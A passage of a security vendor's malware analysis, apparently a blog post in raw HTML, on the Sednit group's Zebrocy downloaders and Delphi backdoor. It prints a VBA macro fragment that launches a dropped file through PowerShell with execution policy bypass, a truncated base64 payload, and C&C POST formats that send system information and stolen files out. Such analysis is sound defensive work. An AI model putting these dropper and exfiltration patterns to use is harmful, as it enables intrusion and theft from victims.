Sub</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-22">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-23"><span class="crayon-s">Public Function XYZ(vF, vW)</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-24">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-25"><span class="crayon-s">vStr = "</span><span class="crayon-v">powershell</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">nop</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Exec </span><span class="crayon-v">Bypass</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Command </span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-i">Process</span><span class="crayon-h"> </span><span class="crayon-c">'" + vF + "';"</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-26">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-27"><span class="crayon-st">Call</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-v">vW</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">Run</span><span class="crayon-sy">(</span><span class="crayon-v">vStr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-28">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-29"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-t">Function</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-30">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-31"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-32">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-33"><span class="crayon-v">TVpQAAIAAAAEAA8A</span><span class="crayon-o">/</span><span class="crayon-o">/</span><span class="crayon-cn">8AALgAAAAAAAAAQAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-34">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-35"><span class="crayon-i">AAAAAAEAALoQAA4ftAnNIbgBTM0hkJBUaGlzIHByb2dyYW0gbXVzdCBiZSBydW4gdW5kZXIgV2lu</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-36">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-37"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p><em>Example of Visual Basic function and base64 encoded first stage from </em><span style="font-family: 'courier new', courier, monospace;"><em>Syria &#8211; New Russia provocations.doc</em></span><em> document.</em></p>
<h2>Archives</h2>
<p>Some campaigns have used an archive to drop the first stage on the victim computer, rather than Office document macros. The archive is presumably delivered as an email attachment.<br />
All first stage of the Zebrocy family are executables with an icon and a document-like filename intended to trick the victim as shown in the Figure3.</p>
<div id="attachment_110757" style="width: 589px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2018/04/Figure3-2.png"><img class="size-full wp-image-110757" src="/wp-content/uploads/2018/04/Figure3-2.png" alt="" width="579" height="120" srcset="https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure3-2.png 579w, https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure3-2-300x62.png 300w" sizes="(max-width: 579px) 100vw, 579px" /></a><p class="wp-caption-text">Figure 3: Zebrocy first stage using a Word document icon</p></div>
<h2>Delphi downloader</h2>
<p>A Delphi downloader is the first stage of the Zebrocy family, although we have seen some campaigns from the Sednit group using the AutoIt stage directly without using this downloader. Most of these Delphi downloader binaries use Office document icons or other icons like Windows library, and sometimes these samples are packed with <a href="https://upx.github.io" target="_blank" rel="noopener">UPX</a>. The purpose of this stage is quite straightforward: it retrieves a maximum of information from the victim&#8217;s computer.</p>
<p>When the malware is launched, a splash window pops up with a bogus error message and the filename of the dropped binary. For example, if the filename is <span style="font-family: 'courier new', courier, monospace;">srsiymyw.exe</span>, the filename that appears in the splash window will be <span style="font-family: 'courier new', courier, monospace;">srsiymyw.doc</span> (see Figure 4). The pop-up’s purpose is to distract the user so that he won&#8217;t think anything unusual is happening on his computer.</p>
<div id="attachment_110758" style="width: 639px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2018/04/Figure4-2.png"><img class="size-full wp-image-110758" src="/wp-content/uploads/2018/04/Figure4-2.png" alt="" width="629" height="302" srcset="https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure4-2.png 629w, https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure4-2-300x144.png 300w" sizes="(max-width: 629px) 100vw, 629px" /></a><p class="wp-caption-text">Figure 4: Delphi downloader splash window</p></div>
<p>In fact, the downloader is busy creating a file under %TEMP% with a filename hardcoded in the binary (although at this stage, the file is empty). Persistence is implemented by adding a Windows registry entry under <span style="font-family: 'courier new', courier, monospace;">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\</span> with the path of the hardcoded filename.</p>
<p>To gather information, the malware creates a new process using the Windows API CreateProcess function with <span style="font-family: 'courier new', courier, monospace;">cmd.exe /c SYSTEMINFO &amp; TASKLIST</span> as lpCommandLine argument. Once the information is retrieved, it sends the result via a HTTP POST request to the C&amp;C server hardcoded in the binary. It retries until it receives the next stage.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-605783236f993687088593" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title">Delphi downloader HTTP POST request</span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST (\/[a-zA-Z0-9\-\_\^\.]*){3}\.(php|dat)?fort=&lt;SerialNumber_C&gt; HTTP/1.0

Connection: keep-alive

Content-Type: application/x-www-form-urlencoded

Content-Length: xxxx

Host: &lt;ip_address&gt;

Accept: text/html, */*

Accept-Encoding: identity

User-Agent: Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1

pol=MM/DD/YYYY%20HH:MM:SS%20(AM|PM)%0D%0A&lt;DriveListing&gt;%0D%0A%0D%0A&lt;Path_to_the_binary&gt;%0D%0A%0D%0A&lt;SYSTEMINFO &amp; TASKLIST output&gt;

[...]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-605783236f993687088593-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f993687088593-2">2</div><div class="crayon-num" data-line="crayon-605783236f993687088593-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f993687088593-4">4</div><div class="crayon-num" data-line="crayon-605783236f993687088593-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f993687088593-6">6</div><div class="crayon-num" data-line="crayon-605783236f993687088593-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f993687088593-8">8</div><div class="crayon-num" data-line="crayon-605783236f993687088593-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f993687088593-10">10</div><div class="crayon-num" data-line="crayon-605783236f993687088593-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f993687088593-12">12</div><div class="crayon-num" data-line="crayon-605783236f993687088593-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f993687088593-14">14</div><div class="crayon-num" data-line="crayon-605783236f993687088593-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f993687088593-16">16</div><div class="crayon-num" data-line="crayon-605783236f993687088593-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f993687088593-18">18</div><div class="crayon-num" data-line="crayon-605783236f993687088593-19">19</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-605783236f993687088593-1"><span class="crayon-e">POST</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">\</span><span class="crayon-o">/</span><span class="crayon-sy">[</span><span class="crayon-v">a</span><span class="crayon-o">-</span><span class="crayon-v">zA</span><span class="crayon-o">-</span><span class="crayon-v">Z0</span><span class="crayon-o">-</span><span class="crayon-cn">9</span><span class="crayon-sy">\</span><span class="crayon-o">-</span><span class="crayon-sy">\</span><span class="crayon-v">_</span><span class="crayon-sy">\</span><span class="crayon-o">^</span><span class="crayon-sy">\</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-o">*</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-cn">3</span><span class="crayon-sy">}</span><span class="crayon-sy">\</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-v">php</span><span class="crayon-o">|</span><span class="crayon-v">dat</span><span class="crayon-sy">)</span><span class="crayon-sy">?</span><span class="crayon-v">fort</span><span class="crayon-o">=</span><span class="crayon-o">&lt;</span><span class="crayon-v">SerialNumber_C</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-v">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f993687088593-2">&nbsp;</div><div class="crayon-line" id="crayon-605783236f993687088593-3"><span class="crayon-v">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f993687088593-4">&nbsp;</div><div class="crayon-line" id="crayon-605783236f993687088593-5"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">application</span><span class="crayon-o">/</span><span class="crayon-v">x</span><span class="crayon-o">-</span><span class="crayon-v">www</span><span class="crayon-o">-</span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f993687088593-6">&nbsp;</div><div class="crayon-line" id="crayon-605783236f993687088593-7"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">xxxx</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f993687088593-8">&nbsp;</div><div class="crayon-line" id="crayon-605783236f993687088593-9"><span class="crayon-v">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-v">ip_address</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f993687088593-10">&nbsp;</div><div class="crayon-line" id="crayon-605783236f993687088593-11"><span class="crayon-v">Accept</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">text</span><span class="crayon-o">/</span><span class="crayon-v">html</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-o">/</span><span class="crayon-o">*</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f993687088593-12">&nbsp;</div><div class="crayon-line" id="crayon-605783236f993687088593-13"><span class="crayon-v">Accept</span><span class="crayon-o">-</span><span class="crayon-v">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">identity</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f993687088593-14">&nbsp;</div><div class="crayon-line" id="crayon-605783236f993687088593-15"><span class="crayon-v">User</span><span class="crayon-o">-</span><span class="crayon-v">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Mozilla </span><span class="crayon-v">v5</span><span class="crayon-sy">.</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">rv</span><span class="crayon-o">:</span><span class="crayon-cn">6.0.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-v">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">6.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f993687088593-16">&nbsp;</div><div class="crayon-line" id="crayon-605783236f993687088593-17"><span class="crayon-v">pol</span><span class="crayon-o">=</span><span class="crayon-v">MM</span><span class="crayon-o">/</span><span class="crayon-v">DD</span><span class="crayon-o">/</span><span class="crayon-v">YYYY</span><span class="crayon-o">%</span><span class="crayon-cn">20HH</span><span class="crayon-o">:</span><span class="crayon-v">MM</span><span class="crayon-o">:</span><span class="crayon-v">SS</span><span class="crayon-o">%</span><span class="crayon-cn">20</span><span class="crayon-sy">(</span><span class="crayon-v">AM</span><span class="crayon-o">|</span><span class="crayon-v">PM</span><span class="crayon-sy">)</span><span class="crayon-o">%</span><span class="crayon-cn">0D</span><span class="crayon-o">%</span><span class="crayon-cn">0A</span><span class="crayon-o">&lt;</span><span class="crayon-v">DriveListing</span><span class="crayon-o">&gt;</span><span class="crayon-o">%</span><span class="crayon-cn">0D</span><span class="crayon-o">%</span><span class="crayon-cn">0A</span><span class="crayon-o">%</span><span class="crayon-cn">0D</span><span class="crayon-o">%</span><span class="crayon-cn">0A</span><span class="crayon-o">&lt;</span><span class="crayon-v">Path_to_the_binary</span><span class="crayon-o">&gt;</span><span class="crayon-o">%</span><span class="crayon-cn">0D</span><span class="crayon-o">%</span><span class="crayon-cn">0A</span><span class="crayon-o">%</span><span class="crayon-cn">0D</span><span class="crayon-o">%</span><span class="crayon-cn">0A</span><span class="crayon-o">&lt;</span><span class="crayon-v">SYSTEMINFO</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-e">TASKLIST </span><span class="crayon-v">output</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f993687088593-18">&nbsp;</div><div class="crayon-line" id="crayon-605783236f993687088593-19"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p><em>Delphi downloader HTTP POST request</em></p>
<p class="Body"><span style="font-family: georgia, palatino, serif;">Once the request has been sent, the C&amp;C server responds by sending the next stage, if the target is considered interesting by the operator. The time elapsing between the sending of the report and the receipt of the payload is a few hours. This next stage is written into the file created earlier and executed.</span></p>
<h2>AutoIt downloader</h2>
<p>The AutoIt downloader is another layer of the reconnaissance phase during an infection of the victim computer. From this point onwards, two scenarios are possible: in the first one, the Delphi downloader is the first stage and the second stage – which is the AutoIt downloader – is a lightweight downloader. In the other scenario, the AutoIt downloader is the first stage and it has all functionalities of the Delphi downloader and even more.</p>
<p>When the AutoIt downloader is the first stage it performs many reconnaissance functions. Even if this one shares some similarities with the Delphi downloader, such as the persistence mechanism and the splash window, it adds more granularity to the reconnaissance phase than that of the Delphi downloader. Here is a non-exhaustive list of its capabilities:</p>
<ul>
<li>Detect sandbox and virtual environment</li>
<li>Get list of installed software (via <span style="font-family: 'courier new', courier, monospace;">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span>)</li>
<li>Get Windows version (32-bit or 64-bit)</li>
<li>Get the process list</li>
<li>Get hard drive information</li>
<li>Get screenshot</li>
<li>Get various information about the victim computer using Windows Management Instrumentation (WMI) objects, probably inspired by code from this <a href="https://github.com/cornernote/autoit-poker_bot/blob/master/includes/vendor/CompInfo/CompInfo.au3" target="_blank" rel="noopener">GitHub repository</a></li>
</ul>
<p>Depending on the previous stage, the name of the AutoIt binary is different. If the malware is dropped as the first stage, it has a document-like name. Otherwise it is given the name hardcoded in the Delphi downloader, as shown in Table 1.</p>

<table id="tablepress-544" class="tablepress tablepress-id-544">
<thead>
<tr class="row-1 odd">
	<th colspan="2" class="column-1"><p style="text-align: center;"><strong>Table 1: AutoIt binary filenames, depending of the first stage</strong></p></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><p><strong>First Stage</strong></p></td><td class="column-2"><p><strong>AutoIt binary Filenames</strong></p></td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><p><strong>Delphi downloader</strong></p></td><td class="column-2"><p style="font-family:'Courier New',;">csrsvc.exe</p></td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><p><strong>Email attachment</strong></p></td><td class="column-2"><p style="font-family:'Courier New', ;">Protocol List_20160606.exe</p> </td>
</tr>
</tbody>
</table>

<p>The purpose of this stage is more of less the same as the previous one. There are many different versions in the wild but all of them include at least the code to achieve the following:</p>
<ul>
<li>Retrieve the serial number of the hard drive C:</li>
<li>Use network functions from <span style="font-family: 'courier new', courier, monospace;">winhttp.dll</span> or <span style="font-family: 'courier new', courier, monospace;">winhttp.au3</span></li>
<li>Execute the payload received from the C&amp;C server</li>
</ul>
<p class="Body"><span style="font-family: georgia, palatino, serif;">In the same way that the Delphi downloader has a splash window, the AutoIt also has a splash window when it comes from an email attachment – the AutoIt is the first stage. The splash screen is related to the binary icon. For example, an AutoIt downloader with Adobe Reader as an icon displays a splash screen saying that the PDF file the victim would be expecting to be displayed is corrupted. An AutoIt binary with a Word icon will display the following popup asking for a password. The password is not considered here; we think it’s just a way to distract the victim from the code’s real malicious activity.</span></p>
<div id="attachment_110761" style="width: 474px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2018/04/Figure5-1.png"><img class="size-full wp-image-110761" src="/wp-content/uploads/2018/04/Figure5-1.png" alt="" width="464" height="177" srcset="https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure5-1.png 464w, https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure5-1-300x114.png 300w" sizes="(max-width: 464px) 100vw, 464px" /></a><p class="wp-caption-text">Figure 5: AutoIt downloader Word popup</p></div>
<h2>Delphi backdoor</h2>
<p>The Delphi backdoor is the final stage of the Zebrocy chain of components. We have seen Zebrocy downloading the Sednit group’s flagship backdoor, Xagent, in the past.<br />
Unlike the previous components, this one has an internal version number that doesn’t seem to be related to a specific campaign. This version number has evolved over time, as shown in Table 2:</p>

<table id="tablepress-545" class="tablepress tablepress-id-545">
<thead>
<tr class="row-1 odd">
	<th colspan="2" class="column-1"><p style="text-align: center"><strong>Table 2: Delphi backdoor internal version history</strong></p></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><strong>PE timestamp</strong></td><td class="column-2"><strong>version</strong></td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">2015-12-28</td><td class="column-2">2.1</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">2016-01-06</td><td class="column-2">2.2</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">2016-01-25</td><td class="column-2">2.3</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">2016-02-03</td><td class="column-2">2.4</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">2016-03-14</td><td class="column-2">2.5</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">2016-04-08</td><td class="column-2">3.0</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">2016-04-26</td><td class="column-2">3.2</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">2016-06-01</td><td class="column-2">4.4</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">2016-09-08</td><td class="column-2">5.0</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">2016-12-15</td><td class="column-2">5.1</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">2017-06-01</td><td class="column-2">7.0</td>
</tr>
<tr class="row-14 even">
	<td class="column-1">2017-09-26</td><td class="column-2">8.0</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">2017-10-12</td><td class="column-2">8.1</td>
</tr>
<tr class="row-16 even">
	<td class="column-1">2017-11-12</td><td class="column-2">8.2</td>
</tr>
<tr class="row-17 odd">
	<td class="column-1">2017-12-26</td><td class="column-2">8.5</td>
</tr>
<tr class="row-18 even">
	<td class="column-1">2018-01-09</td><td class="column-2">8.6</td>
</tr>
<tr class="row-19 odd">
	<td class="column-1">2017-12-18</td><td class="column-2">10.1</td>
</tr>
<tr class="row-20 even">
	<td class="column-1">2018-01-09</td><td class="column-2">10.2</td>
</tr>
<tr class="row-21 odd">
	<td class="column-1">2018-01-16</td><td class="column-2">10.3</td>
</tr>
<tr class="row-22 even">
	<td class="column-1">2018-01-18</td><td class="column-2">11.0</td>
</tr>
<tr class="row-23 odd">
	<td class="column-1">2018-02-07</td><td class="column-2">12.0</td>
</tr>
<tr class="row-24 even">
	<td class="column-1">2018-03-05</td><td class="column-2">13.0</td>
</tr>
<tr class="row-25 odd">
	<td class="column-1">2018-03-06</td><td class="column-2">13.1</td>
</tr>
<tr class="row-26 even">
	<td class="column-1">2018-03-14</td><td class="column-2">14.0</td>
</tr>
<tr class="row-27 odd">
	<td class="column-1">2018-03-28</td><td class="column-2">14.1</td>
</tr>
</tbody>
</table>

<p>Notice that we don’t have the full visibility and we may have missed some versions of the backdoor. Besides, there is some overlap between versions meaning that some older versions are still used at the same time as newer versions.</p>
<p>In the next few paragraphs we will highlight some differences seen in the malware during its evolution.<br />
The backdoor embeds a block of configuration. The configuration values change from one sample to another, but the list of configurable items stays the same. However, the way in which the configuration data are stored in the malware sample has evolved over time.<br />
The first versions of the backdoor embedded the configuration data in plaintext, as shown in Figure 6.</p>
<div id="attachment_110768" style="width: 984px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2018/04/Figure6-1.png"><img class="size-full wp-image-110768" src="/wp-content/uploads/2018/04/Figure6-1.png" alt="" width="974" height="360" srcset="https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure6-1.png 974w, https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure6-1-300x111.png 300w, https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure6-1-768x284.png 768w" sizes="(max-width: 974px) 100vw, 974px" /></a><p class="wp-caption-text">Figure 6: Delphi backdoor plaintext configuration data</p></div>
<p class="Body"><span style="font-family: georgia, palatino, serif;">Then, in later versions, the malware’s authors encoded the configuration data as hexadecimal strings, as shown in Figure 7. </span></p>
<div id="attachment_110769" style="width: 984px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2018/04/Figure7-1.png"><img class="size-full wp-image-110769" src="/wp-content/uploads/2018/04/Figure7-1.png" alt="" width="974" height="300" srcset="https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure7-1.png 974w, https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure7-1-300x92.png 300w, https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure7-1-768x237.png 768w, https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure7-1-522x160.png 522w" sizes="(max-width: 974px) 100vw, 974px" /></a><p class="wp-caption-text">Figure 7: Delphi backdoor encoded configuration data</p></div>
<p>In the latest versions, the configuration data is encrypted in the resources using the AES algorithm. Older versions stored it in the <em>.text</em> section.<br />
The configuration data contains:</p>
<ul>
<li>AES keys to communicate with the C&amp;C server</li>
<li>URLs with paths differing from one sample to another</li>
<li>The version of the malware</li>
<li>The windows registry key/value that ensures the persistence of the backdoor</li>
<li>Path where temporary files are store (<em><span style="font-family: 'courier new', courier, monospace;">%APPDATA%</span>)</em></li>
<li>The names of hidden directories to be created to store temporary files: the directory filenames are concatenated with the environment variable (<span style="font-family: 'courier new', courier, monospace;"><em>%APPDATA%</em></span>)</li>
</ul>
<p>Once the malware is set up, it executes callback functions via the Windows API function <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644906(v=vs.85).aspx" target="_blank" rel="noopener">SetTimer</a>. These callbacks allow the operator to handle many features and commands of the backdoor.</p>
<ul>
<li>Take a screenshot of the Desktop of the victim</li>
<li>Capture keystrokes</li>
<li>List drives/network resources</li>
<li>Read/write into Windows registry</li>
<li>Copy/move/delete a file system object</li>
<li>Execute files or create scheduled tasks</li>
</ul>
<p>The number of commands handled by the backdoor – about 30 – differs from one version to another.<br />
To communicate with the C&amp;C server, the backdoor stores the report of these functions into a temporary file. Then it will read the content of the temporary file and send it on. These temporary files are stored in one of the hidden directories created during the set-up phase.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-605783236f996362210489" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST (\/[a-zA-Z0-9\-\_\^\.]*){3}\.(php|dat). HTTP/1.0

Connection: keep-alive

Content-Type: multipart/form-data; boundary=--------&lt;mmddyyhhnnsszzz&gt;

Content-Length: &lt;N&gt;

Host: &lt;ip_address&gt;

Accept: text/html, */*

Accept-Encoding: identity

User-Agent: Mozilla/3.0 (compatible; Indy Library)

----------&lt;mmddyyhhnnsszzz&gt;

Content-Disposition: form-data; name="userfile"; filename="%APPDATA%\Microsoft\&lt;directories&gt;\&lt;tempfilename&gt;.tmp"

Content-Type: &lt;tempfilename_hex_encoded&gt;.tmp

&lt;tempfilename content&gt;

----------&lt;mmddyyhhnnsszzz&gt;--</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-605783236f996362210489-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-2">2</div><div class="crayon-num" data-line="crayon-605783236f996362210489-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-4">4</div><div class="crayon-num" data-line="crayon-605783236f996362210489-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-6">6</div><div class="crayon-num" data-line="crayon-605783236f996362210489-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-8">8</div><div class="crayon-num" data-line="crayon-605783236f996362210489-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-10">10</div><div class="crayon-num" data-line="crayon-605783236f996362210489-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-12">12</div><div class="crayon-num" data-line="crayon-605783236f996362210489-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-14">14</div><div class="crayon-num" data-line="crayon-605783236f996362210489-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-16">16</div><div class="crayon-num" data-line="crayon-605783236f996362210489-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-18">18</div><div class="crayon-num" data-line="crayon-605783236f996362210489-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-20">20</div><div class="crayon-num" 